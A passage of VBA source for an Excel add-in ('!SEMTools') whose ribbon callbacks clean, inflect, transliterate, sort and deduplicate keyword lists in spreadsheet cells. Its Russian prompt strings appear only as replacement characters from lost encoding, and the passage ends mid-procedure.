Sub SEM_remLast1Words(control As IRibbonControl)
UDFArr2PL "remLastNWords", 1
End Sub
Sub SEM_remLast2Words(control As IRibbonControl)
UDFArr2PL "remLastNWords", 2
End Sub
Sub SEM_remLast3Words(control As IRibbonControl)
UDFArr2PL "remLastNWords", 3
End Sub
Sub SEM_remFirstNWords(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("Word count", "", Type:=1)
UDFArr2PL "remFirstNWords", n
End Sub
Sub SEM_remFirst1Words(control As IRibbonControl)
UDFArr2PL "remFirstNWords", 1
End Sub
Sub SEM_remFirst2Words(control As IRibbonControl)
UDFArr2PL "remFirstNWords", 2
End Sub
Sub SEM_remFirst3Words(control As IRibbonControl)
UDFArr2PL "remFirstNWords", 3
End Sub
Sub SEM_udalit_povtory(control As IRibbonControl)
UDFArr ("remRepWords")
End Sub
Sub SEM_remRepWordsInclMorphs(control As IRibbonControl)
Get_lemmDict
UDFArr ("remRepWordsInclMorphs")
End Sub
Sub SEM_udalitmodifikatorystopslov(control As IRibbonControl)
udalitmodifikatorystopslov
End Sub
Sub SEM_udalit_slovaiztsifr(control As IRibbonControl)
UDFArr ("delNumW")
End Sub
Sub SEM_udalit_slovastsiframi(control As IRibbonControl)
UDFArr ("delWcontNum")
End Sub
Sub SEM_udalit_slovaizlatinitsy(control As IRibbonControl)
UDFArr ("delWordsAllLatin")
End Sub
Sub SEM_udalit_slovaslatinitsyey(control As IRibbonControl)
UDFArr ("delWContLat")
End Sub
Sub SEM_udalitstopslova(control As IRibbonControl)
udalitstopslova
End Sub
Sub SEM_udalitminusslova(control As IRibbonControl)
UDFArr2PS "removeAfterIncluding", " -"
End Sub
Sub SEM_remWord(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", "", Type:=2)
UDFArr2PS "delWordsFullMatch", s
End Sub
Sub SEM_remWordList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSR rng
UDFArr2PRng "delWordsFromRng", abc.Range("BSR")
remBSR
End Sub
Sub SEM_udalitmarkyerypokupki(control As IRibbonControl)
Del1DimArr Split(markyerypokupki(), "\")
End Sub
Sub SEM_udalitmarkyeryaryendy(control As IRibbonControl)
Del1DimArr Split(markyeryaryendy(), "|")
End Sub
Sub SEM_udalitmarkyeryotzyvov(control As IRibbonControl)
Del1DimArr Split(markyeryotzyvov(), "|")
End Sub
Sub SEM_remWordsStarting(control As IRibbonControl)
Dim x As String
x = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "delWordsStartingWith", x
End Sub
Sub SEM_remWordsEnding(control As IRibbonControl)
Dim x As String
x = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "delWordsEndingWith", x
End Sub
Sub SEM_remWordsStartingWithAnyFromRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "remWordsStartingWithAnyFromRng", rng
End Sub
Sub SEM_remWordsEndingWithAnyFromRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "remWordsEndingWithAnyFromRng", rng
End Sub
Sub SEM_remWordsContainingPattern(control As IRibbonControl)
Dim s As String
s = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "delWordsContaining", s
End Sub
Sub SEM_remWordsContainingPatternFromList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "delWordsContainingAnyFromRng", rng
End Sub
'morphs
Sub SEM_remNouns(control As IRibbonControl)
Get_lemmDict
UDFArr "remN"
End Sub
Sub SEM_remVerbs(control As IRibbonControl)
Get_lemmDict
UDFArr "remV"
End Sub
Sub SEM_remAdj(control As IRibbonControl)
Get_lemmDict
UDFArr "remA"
End Sub
Sub SEM_remAdverbs(control As IRibbonControl)
Get_lemmDict
UDFArr "remAdvb"
End Sub
'regex
Sub SEM_delWordsByLikePattern(control As IRibbonControl)
Dim param2 As String
param2 = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "delWordsByLIKEPattern", param2
End Sub
Sub SEM_delWordsByRePattern(control As IRibbonControl)
Dim s As String
s = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "delWordsByRePattern", s
End Sub
'cells
Sub SEM_remCellsContainingWordLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "clIfContWordLst", abc.Range("BSR")
remBSR
End Sub

Sub SEM_remCellsFromList(control As IRibbonControl)
Dim r As Long, deleted As Object, a(), w(), UserRange As Range
Set UserRange = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
OptimizeON
    a = UserRange.Value2
    w = Selection.Value2
    Set deleted = CreateObject("Scripting.Dictionary")
        For r = LBound(a) To UBound(a)
        If deleted.exists(UCase$(a(r, 1))) Then Else deleted.Add UCase$(a(r, 1)), False
        Next
For r = LBound(w) To UBound(w):
    If deleted.exists(UCase(w(r, 1))) Then w(r, 1) = ""
Next r
    Selection.Value2 = w
OptimizeOFF
End Sub
Sub SEM_remCellsFullDupes(control As IRibbonControl)
Dim r As Long, deleted As Object, a()
OptimizeON
    a = Selection.Value2
    Set deleted = CreateObject("Scripting.Dictionary")
        For r = LBound(a) To UBound(a)
        If deleted.exists(a(r, 1)) Then a(r, 1) = "" Else deleted.Add a(r, 1), False
        Next
    Selection.Value2 = a
OptimizeOFF
End Sub
Sub SEM_remCellsDupes(control As IRibbonControl)
Dim r As Long, deleted As Object, a()
OptimizeON
    a = Selection.Value2
    Set deleted = CreateObject("Scripting.Dictionary")
        For r = LBound(a) To UBound(a)
        If deleted.exists(WStrim(UCase$(a(r, 1)))) Then a(r, 1) = "" Else deleted.Add WStrim(UCase$(a(r, 1))), False
        Next
    Selection.Value2 = a
OptimizeOFF
End Sub
Sub SEM_remCellsDupesHidden(control As IRibbonControl)
Dim r As Long, deleted As Object, a()
OptimizeON
    a = Selection.Value2
    Set deleted = CreateObject("Scripting.Dictionary")
        For r = LBound(a) To UBound(a)
        If deleted.exists(sortInCellAZ(WStrim(UCase$(a(r, 1))))) Then a(r, 1) = "" Else deleted.Add sortInCellAZ(WStrim(UCase$(a(r, 1)))), False
        Next
    Selection.Value2 = a
OptimizeOFF
End Sub

Sub SEM_udalit_UTM_myetki(control As IRibbonControl)
UDFArr ("byezUTMmyetok")
End Sub
' Formulas
Sub SEM_udalit_formuly(control As IRibbonControl)
Selection.Value2 = Selection.Value2
End Sub
Sub SEM_remFormulasFmSheet(control As IRibbonControl)
ActiveSheet.UsedRange.Value2 = ActiveSheet.UsedRange.Value2
End Sub
Sub SEM_remFormulasFmBook(control As IRibbonControl)
Dim ws As Worksheet
For Each ws In Worksheets
  With ws.UsedRange
    .Value = .Value
  End With
Next ws
End Sub
'Words
Sub SEM_udalit_slova_pyervoye(control As IRibbonControl)
udalit_slova_pyervoye
End Sub
Sub SEM_udalit_slova_poslyednyeye(control As IRibbonControl)
udalit_slova_poslyednyeye
End Sub
Sub SEM_udalit_toponimy(control As IRibbonControl)
remPhrases abc.Range("GEO_Toponyms")
End Sub
Sub SEM_udalit_toponimy_s_pryedlogami(control As IRibbonControl)
Get_Geo
udalit_toponimy_s_pryedlogami
End Sub
Sub SEM_delTopsWithPreps(control As IRibbonControl)
Get_Geo
udalit_toponimy_s_pryedlogami True
End Sub
Sub SEM_remPhrases(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", Type:=8)
remPhrases rng
End Sub
'Cells
Sub SEM_RemCellsContainingPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "clIfContPLst", rng
End Sub
Sub SEM_RemCellsStartingWithPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "clIfStartsWithPLst", rng
End Sub
Sub SEM_RemCellsEndingWithPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "clIfEndsWithPLst", rng
End Sub
'|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Sub SEM_remUniqueCells(control As IRibbonControl)
CellsByRep True, "del"
End Sub
Sub SEM_remNonUniqueCells(control As IRibbonControl)
CellsByRep False, "del"
End Sub
'Ranges
Sub SEM_udalitpustyyestroki(control As IRibbonControl)
remBlankRows
End Sub
Sub SEM_udalitpustyyestolbtsy(control As IRibbonControl)
remBlankColumns
End Sub
Sub SEM_remRowsIfBlank(control As IRibbonControl)
remRowsIfCellTrue "isBlank"
End Sub
Sub SEM_remRowsIfNonAlfaNum(control As IRibbonControl)
remRowsIfCellTrue "isNonAlfaNum"
End Sub
Sub SEM_remRowsIfContLat(control As IRibbonControl)
remRowsIfCellTrue "contLat"
End Sub
Sub SEM_remRowsIfContNum(control As IRibbonControl)
remRowsIfCellTrue "contNum"
End Sub
Sub SEM_remRowsIfNonContLat(control As IRibbonControl)
remRowsIfCellTrue "nonContLat"
End Sub
Sub SEM_remRowsIfNonContNum(control As IRibbonControl)
remRowsIfCellTrue "nonContNum"
End Sub
Sub SEM_remRowsIfHasNumW(control As IRibbonControl)
remRowsIfCellTrue "hasNumW"
End Sub
Sub SEM_remRowsIfHasWord(control As IRibbonControl)
Dim s As String
s = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", title:="!SEMTools", Type:=2)
remRowsIfCellTrue2PS "containsWord", s
End Sub
Sub SEM_remRowsIfHasNoWord(control As IRibbonControl)
Dim s As String
s = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", title:="!SEMTools", Type:=2)
remRowsIfCellTrue2PS "notContainsWord", s
End Sub
Sub SEM_remRowsIfHasAnyWordFromList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
remRowsIfCellTrue2PRng "hasAnyWordsFromSortedList", abc.Range("BSR")
remBSR
End Sub
Sub SEM_remRowsIfHasNoWordsFromList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
remRowsIfCellTrue2PRng "hasNoWordsFromSortedList", abc.Range("BSR")
remBSR
End Sub
Sub SEM_remRowsIfIsShorter(control As IRibbonControl)
Dim l As Long
l = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=1)
remRowsIfCellTrue2PL "isShorterThan", l
End Sub
Sub SEM_remRowsIfIsLonger(control As IRibbonControl)
Dim l As Long
l = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", title:="!SEMTools", Type:=1)
remRowsIfCellTrue2PL "isLongerThan", l
End Sub
' C H A N G E  <><>><><><>><><><><><><><>><><><><><<>><><><><><<>><

'symbols
Sub SEM_ryegistr_vsyestrochn(control As IRibbonControl)
ryegistr_vsyestrochn
End Sub
Sub ryegistr_vsyestrochn()
UDFArr ("lowercase")
End Sub
Sub SEM_ryegistr_vsyesbolshoy(control As IRibbonControl)
UDFArr ("vsyesbolshoy")
End Sub
Sub SEM_goroda_s_bolshoy(control As IRibbonControl)
replPhrasesByThemselves abc.Range("GEO_Toponyms")
End Sub
Sub SEM_ryegistr_pryedlozhyeniyasbolshoy(control As IRibbonControl)
UDFArr ("SentenceCase")
End Sub
Sub SEM_ryegistr_latinitsasbolshoy(control As IRibbonControl)
UDFArr ("capWcontLat")
End Sub
Sub SEM_ryegistr_latinitsaCapsLock(control As IRibbonControl)
UDFArr ("latinitsaCapsLock")
End Sub
Sub SEM_ryegistr_naytiabbryeviatury(control As IRibbonControl)
ryegistr_naytiabbryeviatury
End Sub
Sub SEM_ryegistr_vsyekapslokom(control As IRibbonControl)
UDFArr ("vsyekapslokom")
End Sub
Sub SEM_numToWords(control As IRibbonControl)
UDFArr "numToWords"
End Sub
Sub SEM_sumToWords(control As IRibbonControl)
UDFArr "sumToWords"
End Sub
Sub SEM_corrNumbers(control As IRibbonControl)
Dim rng As Range
Dim WorkRng As Range
On Error Resume Next
Set WorkRng = Application.Selection
Set WorkRng = WorkRng.SpecialCells(xlCellTypeConstants, xlNumbers)
For Each rng In WorkRng
    If Not rng.HasFormula Then
        rng = rng.Value
    End If
Next
Selection.NumberFormat = "General"
Selection.Value = Selection.Value
    Selection.Replace What:=".", Replacement:=".", LookAt:=xlPart
    Selection.Replace What:=",", Replacement:=",", LookAt:=xlPart
End Sub
'''
Sub SEM_translit(control As IRibbonControl)
UDFArr ("Translit")
End Sub
Sub SEM_untranslit(control As IRibbonControl)
UDFArr ("Untranslit")
End Sub
Sub SEM_punto(control As IRibbonControl)
UDFArr ("PuntoSwitch")
End Sub
Sub SEM_replRuEn(control As IRibbonControl)
UDFArr ("ReplCommonLettersRuEn")
End Sub
Sub SEM_replEnRu(control As IRibbonControl)
UDFArr ("ReplCommonLettersEnRu")
End Sub
'words
'MORPHOLOGY - nouns
Sub SEM_roditEd(control As IRibbonControl)
UDFArr ("roditEdNoun")
End Sub
Sub SEM_datEd(control As IRibbonControl)
UDFArr ("datEdNoun")
End Sub
Sub SEM_vinitEd(control As IRibbonControl)
UDFArr ("vinitEdNoun")
End Sub
Sub SEM_tvoritEd(control As IRibbonControl)
UDFArr ("tvoritEdNoun")
End Sub
Sub SEM_predlEd(control As IRibbonControl)
UDFArr ("predlEdNoun")
End Sub
Sub SEM_Mnozh(control As IRibbonControl)
UDFArr ("MnozhNoun")
End Sub
Sub SEM_roditMn(control As IRibbonControl)
UDFArr ("roditMnNoun")
End Sub
Sub SEM_datMn(control As IRibbonControl)
UDFArr ("datMnNoun")
End Sub
Sub SEM_vinitMn(control As IRibbonControl)
UDFArr ("vinitMnNoun")
End Sub
Sub SEM_tvoritMn(control As IRibbonControl)
UDFArr ("tvoritMnNoun")
End Sub
Sub SEM_predlMn(control As IRibbonControl)
UDFArr ("predlMnNoun")
End Sub
'MORPHOLOGY - adj
Sub SEM_roditEdAdj(control As IRibbonControl)
UDFArr ("roditEdAdj")
End Sub
Sub SEM_datEdAdj(control As IRibbonControl)
UDFArr ("datEdAdj")
End Sub
Sub SEM_vinitEdAdj(control As IRibbonControl)
UDFArr ("vinitEdAdj")
End Sub
Sub SEM_tvoritEdAdj(control As IRibbonControl)
UDFArr ("tvoritEdAdj")
End Sub
Sub SEM_predlEdAdj(control As IRibbonControl)
UDFArr ("predlEdAdj")
End Sub
Sub SEM_MnozhAdj(control As IRibbonControl)
UDFArr ("MnozhAdj")
End Sub
Sub SEM_roditMnAdj(control As IRibbonControl)
UDFArr ("roditMnAdj")
End Sub
Sub SEM_datMnAdj(control As IRibbonControl)
UDFArr ("datMnAdj")
End Sub
Sub SEM_vinitMnAdj(control As IRibbonControl)
UDFArr ("vinitMnAdj")
End Sub
Sub SEM_tvoritMnAdj(control As IRibbonControl)
UDFArr ("tvoritMnAdj")
End Sub
Sub SEM_predlMnAdj(control As IRibbonControl)
UDFArr ("predlMnAdj")
End Sub
Sub SEM_imFemAdj(control As IRibbonControl)
UDFArr ("imFemAdj")
End Sub
Sub SEM_RDTPFemAdj(control As IRibbonControl)
UDFArr ("RDTPFemAdj")
End Sub
Sub SEM_vinFemAdj(control As IRibbonControl)
UDFArr ("vinFemAdj")
End Sub
Sub SEM_imNoneAdj(control As IRibbonControl)
UDFArr ("imNoneAdj")
End Sub
Sub SEM_capOwnList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "capWordList", abc.Range("BSR")
remBSR
End Sub
Sub SEM_capsOwnList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "capsWordList", abc.Range("BSR")
remBSR
End Sub
Sub SEM_moveWordsToBeg(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "moveWordsToBeg", abc.Range("BSR")
remBSR
End Sub
Sub SEM_moveWordsToEnd(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "moveWordsToEnd", abc.Range("BSR")
remBSR
End Sub
'''
Sub SEM_insertAfterWords(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
UDFArr2PS "insertAfterWords", s
End Sub
Sub SEM_insertBeforeWords(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
UDFArr2PS "insertBeforeWords", s
End Sub
'cells
Sub SEM_vsye_naoborot(control As IRibbonControl)
UDFArr ("ReverseString")
End Sub
Sub SEM_sortirovataya(control As IRibbonControl)
UDFArr ("sortInCellAZ")
End Sub
Sub SEM_flipwords(control As IRibbonControl)
UDFArr ("flipwords")
End Sub
Sub SEM_addAfter(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
UDFArr2PS "insertAfter", s
End Sub
Sub SEM_addBefore(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
UDFArr2PS "insertBefore", s
End Sub
Sub SEM_insertBeforeAndAfter(control As IRibbonControl)
Dim s As String
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
UDFArr2PS "wrapByString", s
End Sub
Sub SEM_blanksToZeros(control As IRibbonControl)
UDFArr "blankToZero"
End Sub
'|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Sub SEM_replUniqueCells(control As IRibbonControl)
CellsByRep True, "repl"
End Sub
Sub SEM_replNonUniqueCells(control As IRibbonControl)
CellsByRep False, "repl"
End Sub
'ranges
Sub SEM_sortSelection(control As IRibbonControl)
sortSelection
End Sub
Sub SEM_sortArrByEnding(control As IRibbonControl)
UDFArr ("ReverseString")
sortSelection
UDFArr ("ReverseString")
End Sub
Private Function symCnt(x As String)
symCnt = CStr(100000 + Len(x)) & x
End Function
Private Function wCnt(x As String)
wCnt = CStr(100000 + slov(x)) & x
End Function
Sub SEM_sortArrBySymCount(control As IRibbonControl)
UDFArr ("symCnt")
sortSelection
UDFArr2PL "remFirstNSym", 6
End Sub
Sub SEM_sortArrByWordCount(control As IRibbonControl)
UDFArr ("wCnt")
sortSelection
UDFArr2PL "remFirstNSym", 6
End Sub
Sub SEM_replWordsInRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
rng.Copy
abc.Range("K1").PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
abc.Range("K:L").Sort Key1:=abc.Range("K1"), Order1:=xlAscending, Header:=xlNo
abc.Range("K1", abc.Range("K1").End(xlDown).Offset(0, 1)).name = "replRNG"
UDFArr2PRng "replWordsFromRng", abc.Range("replRNG")
abc.Range("K:L").Clear
End Sub
Sub SEM_replPatternsInRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
UDFArr2PRng "replSubStrings", rng
End Sub
Sub SEM_regexReplaceRng(control As IRibbonControl)
Dim p As String, s As String
p = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=2)
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|:", "", Type:=2)
UDFArr3PS "rgxReplace", p, s
End Sub
Sub SEM_replFirstOcc(control As IRibbonControl)
Dim p As String, s As String
p = Application.InputBox("|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=2)
s = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|:", "", Type:=2)
UDFArr3PS "replFirstOcc", p, s
End Sub
Sub SEM_fillDown(control As IRibbonControl)
Dim a(), i As Long
OptimizeON
    a = Selection.Value2
For i = LBound(a) + 1 To UBound(a):
If a(i, 1) = vbNullString Then a(i, 1) = a(i - 1, 1)
Next
    Selection.Value2 = a
OptimizeOFF
End Sub
Sub SEM_fillUp(control As IRibbonControl)
Dim a(), i As Long
OptimizeON
    a = Selection.Value2
For i = UBound(a) - 1 To LBound(a) Step -1:
If a(i, 1) = vbNullString Then a(i, 1) = a(i + 1, 1)
Next
    Selection.Value2 = a
OptimizeOFF
End Sub
' i z v l ye ch  <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
Sub SEM_ExtrC(control As IRibbonControl)
UDFArr ("extrCyr")
End Sub
Sub SEM_ExtrL(control As IRibbonControl)
UDFArr ("extrLatin")
End Sub
Sub SEM_ExtrWordChars(control As IRibbonControl)
UDFArr ("extrWChars")
End Sub
Sub SEM_ExtrRE(control As IRibbonControl)
Dim p As String
p = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
